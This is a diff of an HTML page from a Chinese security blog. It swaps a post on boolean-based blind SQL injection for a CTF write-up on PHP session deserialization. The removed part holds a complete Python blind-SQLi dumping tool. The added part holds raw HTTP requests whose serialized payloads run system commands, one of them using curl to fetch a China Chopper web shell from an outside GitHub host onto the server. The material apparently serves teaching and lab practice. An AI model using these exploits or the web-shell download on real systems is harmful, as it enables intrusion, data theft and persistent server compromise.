@@ -3,9 +3,9 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SQL注入之布尔型注入 - Reber's Blog</title>
+    <title>关于PHP SESSION反序列化 - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,python,php,linux">
-    <meta name="description" content="">
+    <meta name="description" content="基于第三届4.29“安恒杯”网络安全技术大赛初赛中的题，第三个web题，php反序列化漏洞">
     <meta name="author" content="reber">
 
     
@@ -79,12 +79,12 @@
     <div class="main">
         <div class="left">
             <div>
-                <h2>SQL注入之布尔型注入</h2>
+                <h2>关于PHP SESSION反序列化</h2>
                 
                 <div class="post-meta">
                     <div style="padding:5px 5px 2px 5px;">
                         <i class="fa fa-calendar fa-fw"></i>
-                        <time>2016-06-23</time>
+                        <time>2018-07-23</time>
                         &nbsp;&nbsp;&nbsp;&nbsp;
                     
 
@@ -106,7 +106,7 @@
                         
                             <i class="fa fa-tags fa-fw"></i>
                             
-                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/php">php</a>
                             
                         
                         
@@ -118,258 +118,91 @@
                 
                 
 
-<h3 id="0x00-特点">0x00 特点</h3>
+<h3 id="0x00-环境">0x00 环境</h3>
 
-<pre><code>当页面存在注入，但是没有显示位，且没有用echo &quot;mysql_error()&quot;输出错误信息时可以用，
-它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
+<p>PHP：PHP Version 5.5.35<br />
+System： Linux version 2.6.32-504.23.4.el6.x86_64 (Red Hat 4.4.7-11)<br />
+Apache：Apache/2.2.15</p>
+
+<p>公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。</p>
+
+<p>其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题</p>
+
+<p>我比较菜，这里根据网上已有writeup做一下，记录一下</p>
+
+<h3 id="0x00-php-session-序列化及反序列化处理器">0x00 PHP Session 序列化及反序列化处理器</h3>
+
+<p>php在session存储和读取时,都会有一个序列化和反序列化的过程，反序列化中会调用对象的magic方法,比如<code>__destruct(),__wakeup()</code>等</p>
+
+<p>PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，这几种处理器如下：</p>
+
+<pre><code>---------------------------------------------------------------------------------------------
+处理器                      |对应的存储格式
+---------------------------------------------------------------------------------------------
+php                        |键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
+php_binary                 |键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
+php_serialize (php&gt;=5.5.4) |经过 serialize() 函数反序列处理的数组
+---------------------------------------------------------------------------------------------
 </code></pre>
 
-<h3 id="0x01-利用方式">0x01 利用方式</h3>
+<p>如果 PHP 在反序列化存储的 SESSION 数据时使用的处理器和序列化时使用的处理器不同，可能会导致数据无法正确反序列化，经过构造甚至可以执行代码</p>
 
-<pre><code>用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+
-根据返回页面是否相同来得到数据
+<h3 id="0x01-环境设置">0x01 环境设置</h3>
+
+<pre><code>POST /phpinfo.php HTTP/1.1
+Host: 10.11.11.11
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------162809728719447253529785011
+Content-Length: 496
+
+-----------------------------162809728719447253529785011
+Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;
+
+ddd|O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:1:&quot;1&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:27:&quot;system('ls /var/www/html');&quot;;}}}
+-----------------------------162809728719447253529785011
+Content-Disposition: form-data; name=&quot;file&quot;; filename='1.txt'
+Content-Type: text/plain
+
+aaaaaa
+-----------------------------162809728719447253529785011--
 </code></pre>
 
-<h3 id="0x02-注入步骤">0x02 注入步骤</h3>
+<pre><code>POST /index.php HTTP/1.1
+Host: 192.168.3.136
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Cookie: PHPSESSID=sgff21msc3q4bvoh8dj8dni7o1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------162809728719447253529785011
+Content-Length: 575
 
-<ol>
-<li><p>找到注入点，判断闭合字符
-<img src="/img/post/sqli8_get_closed_character.png" alt="得到闭合字符" /></p></li>
+-----------------------------162809728719447253529785011
+Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;
 
-<li><p>尝试猜解列数，得到显示位
-<img src="/img/post/sqli8_order_by.png" alt="猜解列数" />
-<img src="/img/post/sqli8_display_point.png" alt="尝试得到显示位" /></p></li>
+ddd|O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:1:&quot;1&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:105:&quot;system('curl -o /var/www/html/reber.php https://raw.githubusercontent.com/reber0/tmp/master/caidao.php');&quot;;}}}
+-----------------------------162809728719447253529785011
+Content-Disposition: form-data; name=&quot;file&quot;; filename='1.php'
+Content-Type: application/octet-stream
 
-<li><p>得到数据库名
-<img src="/img/post/sqli8_get_db_num.png" alt="猜解数据库数量" />
-<img src="/img/post/sqli8_get_db_name_char.png" alt="猜第5个数据库第2个字符" />
-最终得到第五个数据库名为security</p></li>
-
-<li><p>得到表名
-<img src="/img/post/sqli8_get_table_num_name_len.png" alt="猜解表的数量和第4张表的表名长度" />
-<img src="/img/post/sqli8_get_table_name_char.png" alt="猜第4个表第1个字符" />
-最终依次猜的表名为users</p></li>
-
-<li><p>得到列名
-<img src="/img/post/sqli8_get_column_num.png" alt="猜解有几列" />
-<img src="/img/post/sqli8_get_column_name_len.png" alt="猜解users表第2列列名的长度" />
-<img src="/img/post/sqli8_get_column_name_one_char.png" alt="猜测users表第2列列名的第1个字符" />
-同理最终得到第2列列名为username，第3列列名为password</p></li>
-
-<li><p>得到列值
-<img src="/img/post/sqli8_get_column_value_num.png" alt="猜解数据条数" />
-<img src="/img/post/sqli8_get_column_value_len.png" alt="猜解第13条数据username字段值的长度" />
-<img src="/img/post/sqli8_get_column_value_char.png" alt="猜解第13条数据username字段值的前两个字符" />
-依次得到为admin4，同理可得其他数据</p></li>
-</ol>
-
-<h3 id="0x04-附上python脚本">0x04 附上python脚本</h3>
-
-<pre><code class="language-python">#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-# code by reber &lt;1070018473@qq.com&gt;
-
-__author__=&quot;reber&quot;
-
-import sys
-import requests
-import binascii
-import hashlib
-from pyfiglet import figlet_format
-from optparse import OptionParser
-
-
-def get_md5_html(url):
-    html = requests.get(url=url).content
-
-    m2 = hashlib.md5()
-    m2.update(html)
-    md5_html = m2.hexdigest()
-
-    return md5_html
-
-def get2(*args): #二分法得到数值
-    low,high,url,payload,standard_md5 = args
-    while low &lt;= high:
-        mid = (low + high)/2;
-
-        mid_url = url + payload.format(mid=mid)
-        mid_md5_html = get_md5_html(mid_url)
-
-        if standard_md5 == mid_md5_html:
-            low = mid + 1
-        else:
-            high = mid-1
-
-        num = (low+high+1)/2
-    return num
-
-def getAllDatabases(url):
-    standard_md5 = get_md5_html(url)
-    # print standard_md5
-
-    payload = &quot;' and ((select count(distinct+table_schema) from information_schema.tables) &gt; {mid})--+&quot;
-    # payload = payload.replace(' ','%20')
-    db_num = get2(1,100,url,payload,standard_md5)
-
-    print &quot;The total number of database is: %d&quot; % db_num
-    for index in xrange(0,db_num):  #一次循环输出一个数据库名
-        payload = &quot;' and (length((select distinct table_schema from information_schema.tables limit {index},1)) &gt; {mid})--+&quot;.format(index=index,mid='{mid}')
-        # payload = payload.replace(' ','%20')
-
-        db_name_len = get2(1,30,url,payload,standard_md5)
-
-        # print &quot;database name length:%d&quot; % db_name_len
-        print &quot;[*] &quot;,
-        for x in xrange(1,db_name_len+1):   #一次for循环输出数据库名的一个字符            
-            payload = &quot;' and (select ascii(substr((select distinct table_schema from information_schema.tables limit {index},1), {x}, 1)) &gt; {mid}) --+&quot;.format(index=index,x=x,mid='{mid}')
-            # payload = payload.replace(' ','%20')
-
-            str_ascii = get2(32,126,url,payload,standard_md5)
-
-            database_name_one_str = chr(str_ascii)
-            # print database_name_one_str
-            sys.stdout.write(database_name_one_str)
-            sys.stdout.flush()
-        print
-
-def getAllTablesByDb(url,db_name):
-    standard_md5 = get_md5_html(url)
-    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
-    # print standard_md5
-
-    payload = &quot;' and ((select count(distinct+table_name) from information_schema.tables where table_schema={db_name_hex}) &gt; {mid})--+&quot;.format(db_name_hex=db_name_hex,mid='{mid}')
-    # payload = &quot;/**/&quot;.join(payload.split())
-    db_num = get2(1,200,url,payload,standard_md5)
-
-    print &quot;Database %s: [%d tables]&quot; % (db_name,db_num)
-    for index in xrange(0,db_num):  #一次循环输出一个表名
-        payload = &quot;' and (length((select distinct table_name from information_schema.tables where table_schema={db_name_hex} limit {index},1)) &gt; {mid})--+&quot;.format(db_name_hex=db_name_hex,index=index,mid='{mid}')
-        payload = &quot;/**/&quot;.join(payload.split())
-        table_name_len = get2(1,30,url,payload,standard_md5)
-
-        print &quot;[*] &quot;,
-        for x in xrange(1,table_name_len+1):   #一次for循环输出表名的一个字符
-            payload = &quot;' and (select ascii(substr((select distinct table_name from information_schema.tables where table_schema={db_name_hex} limit {index},1), {x}, 1)) &gt; {mid}) --+&quot;.format(db_name_hex=db_name_hex,index=index,x=x,mid='{mid}')
-            # payload = &quot;/**/&quot;.join(payload.split())
-            str_ascii = get2(32,126,url,payload,standard_md5)
-
-            table_name_one_str = chr(str_ascii)
-            sys.stdout.write(table_name_one_str)
-            sys.stdout.flush()
-        print 
-
-def getAllColumnsByTable(url,table_name,db_name):
-    #for循环，一次得到一列的列名：
-        #while循环得到列名的长度：
-        #for循环，一次得出列名的一个字符
-    standard_md5 = get_md5_html(url)
-    table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table_name)
-    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
-    # print standard_md5
-
-    payload = &quot;' and ((select count(distinct+column_name) from information_schema.columns where table_name={table_name_hex} and table_schema={db_name_hex}) &gt; {mid})--+&quot;.format(table_name_hex=table_name_hex,db_name_hex=db_name_hex,mid='{mid}')
-    # payload = &quot;/**/&quot;.join(payload.split())
-    column_num = get2(1,200,url,payload,standard_md5)
-
-    print &quot;Table %s: [%d columns]&quot; % (table_name,column_num)
-    for index in xrange(0,column_num):  #一次循环输出一个列名
-        payload = &quot;' and (length((select distinct column_name from information_schema.columns where table_name={} and table_schema={} limit {},1)) &gt; {})--+&quot;.format(table_name_hex,db_name_hex,index,'{mid}')
-        # payload = &quot;/**/&quot;.join(payload.split())
-        column_name_len = get2(1,30,url,payload,standard_md5)
-
-        # print &quot;column length is: %d&quot; % column_name_len
-        print &quot;[*] &quot;,
-        for x in xrange(1,column_name_len+1):   #一次for循环输出列名的一个字符
-            payload = &quot;' and (select ascii(substr((select distinct column_name from information_schema.columns where table_name={} and table_schema={} limit {},1), {}, 1)) &gt; {}) --+&quot;.format(table_name_hex,db_name_hex,index,x,'{mid}')
-            # payload = &quot;/**/&quot;.join(payload.split())
-            str_ascii = get2(32,126,url,payload,standard_md5)
-
-            column_name_one_str = chr(str_ascii)
-            sys.stdout.write(column_name_one_str)
-            sys.stdout.flush()
-        print
-
-def getAllcontent(url,column_name,table_name,db_name):
-    #for循环，一次得到一行的值
-        #while循环得到每个字段的长度
-        #for循环，一次得出一个字段的一个字符
-    column_name = column_name.split(',')
-    len_column_name = len(column_name)
-    # print &quot;len_column_name:%d&quot; % len_column_name
-    standard_md5 = get_md5_html(url)
-    table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table_name)
-    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
-    # print standard_md5
-
-    payload = &quot;' and ((select count(*) from {}.{}) &gt; {})--+&quot;.format(db_name,table_name,'{mid}')
-    payload = &quot;/**/&quot;.join(payload.split())
-    column_value_num = get2(1,10000,url,payload,standard_md5)
-
-    print &quot;The %s table with %d row value: &quot; % (table_name,column_value_num)
-    stri = &quot;&quot;
-    for x in xrange(0,len_column_name):#输出title
-        stri += &quot;%s\t&quot; % column_name[x]
-    print stri
-    for index in xrange(0,column_value_num):  #一次循环输出一行数据
-        for y in xrange(0,len_column_name):  #一次输出一行的一列的值,循环完输出一行的值
-            payload = &quot;' and (length((select {} from {}.{} limit {},1)) &gt; {})--+&quot;.format(column_name[y],db_name,table_name,index,'{mid}')
-            # payload = &quot;/**/&quot;.join(payload.split())
-            column_value_len = get2(1,30,url,payload,standard_md5)
-
-            # print &quot;column value length is: %d&quot; % column_value_len
-            for x in xrange(1,column_value_len+1): #得到一行数据的一列的值
-                payload = &quot;' and (select ascii(substr((select {} from {}.{} limit {},1), {}, 1)) &gt; {}) --+&quot;.format(column_name[y],db_name,table_name,index,x,'{mid}')
-                # payload = &quot;/**/&quot;.join(payload.split())
-                str_ascii = get2(32,126,url,payload,standard_md5)
-
-                column_name_one_str = chr(str_ascii)
-                sys.stdout.write(column_name_one_str)
-                sys.stdout.flush()
-            sys.stdout.write(&quot;\t&quot;)
-        print
-
-
-def main():
-    print figlet_format(&quot;sql-bool&quot;)
-    parser = OptionParser(usage='Usage: python %prog [options]',version='%prog 1.2')
-    parser.add_option(&quot;-u&quot;,&quot;--URL&quot;,action=&quot;store&quot;,
-              type=&quot;string&quot;,dest=&quot;url&quot;,
-              help=&quot;target url&quot;)
-    parser.add_option(&quot;-D&quot;,&quot;--DB&quot;,action=&quot;store&quot;,
-              type=&quot;string&quot;,dest=&quot;db_name&quot;,
-              help=&quot;get database name&quot;)
-    parser.add_option(&quot;-T&quot;,&quot;--TBL&quot;,action=&quot;store&quot;,
-              type=&quot;string&quot;,dest=&quot;table_name&quot;,
-              help=&quot;get table name&quot;)
-    parser.add_option(&quot;-C&quot;,&quot;--COL&quot;,action=&quot;store&quot;,
-              type=&quot;string&quot;,dest=&quot;column_name&quot;,
-              help=&quot;get column name&quot;)
-    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,
-              dest=&quot;dbs&quot;,help=&quot;get all database name&quot;)
-    (options,args) = parser.parse_args()
-
-    if options == None or options.url == None:
-        parser.print_help()
-    elif options.column_name and options.table_name and options.db_name:
-        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
-    elif options.table_name and options.db_name:
-        getAllColumnsByTable(options.url,options.table_name,options.db_name)
-    elif options.db_name:
-        getAllTablesByDb(options.url,options.db_name)    
-    elif options.dbs:
-        getAllDatabases(options.url)
-    elif options.url:
-        parser.print_help()
-
-
-if __name__ == '__main__':
-    main()
-    #python test.py -u &quot;http://192.168.188.134/sqli/Less-8/?id=1&quot; --dbs
-    #python test.py -u &quot;http://192.168.188.134/sqli/Less-8/?id=1&quot; -D security
-    #python test.py -u &quot;http://192.168.188.134/sqli/Less-8/?id=1&quot; -D security -T users
-    #python test.py -u &quot;http://192.168.188.134/sqli/Less-8/?id=1&quot; -D security -T users -C username,password
+&lt;dddd&gt;
+-----------------------------162809728719447253529785011--
 </code></pre>
+
+<p><br></p>
+
+<h4 id="reference-侵删">Reference(侵删)：</h4>
+
+<ul>
+<li><a href="http://drops.wooyun.org/tips/3909">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></li>
+<li><a href="https://www.tuicool.com/articles/BfuayyI">安恒429|web 3 session反序列化</a></li>
+<li><a href="http://www.mottoin.com/18436.html">有趣的php反序列化总结</a></li>
+</ul>
 
                 
                 <div style="padding:10px 1px;">
@@ -385,13 +218,13 @@ if __name__ == '__main__':
 <div class="prev-next-post pure-g">
   <div class="pure-u-1-24" style="text-align: left;">
     
-    <a href="http://wyb0.com/posts/injection-of-error-based/"><i class="fa fa-chevron-left"></i></a>
+    <a href="http://wyb0.com/posts/structs2-some-vulnerability-payload/"><i class="fa fa-chevron-left"></i></a>
     
   </div>
   <div class="pure-u-10-24">
     
     <nav class="prev">
-      <a href="http://wyb0.com/posts/injection-of-error-based/">SQL注入之报错型注入</a>
+      <a href="http://wyb0.com/posts/structs2-some-vulnerability-payload/">Struts 2相关漏洞payload</a>
     </nav>
     
   </div>
@@ -400,14 +233,8 @@ if __name__ == '__main__':
   </div>
   <div class="pure-u-10-24">
     
-    <nav class="next">
-      <a href="http://wyb0.com/posts/injection-of-time-based/">SQL注入之基于时间的注入</a>
-    </nav>
-    
   </div>
   <div class="pure-u-1-24" style="text-align: right;">
-    
-    <a href="http://wyb0.com/posts/injection-of-time-based/"><i class="fa fa-chevron-right"></i></a>
     
   </div>
 </div>
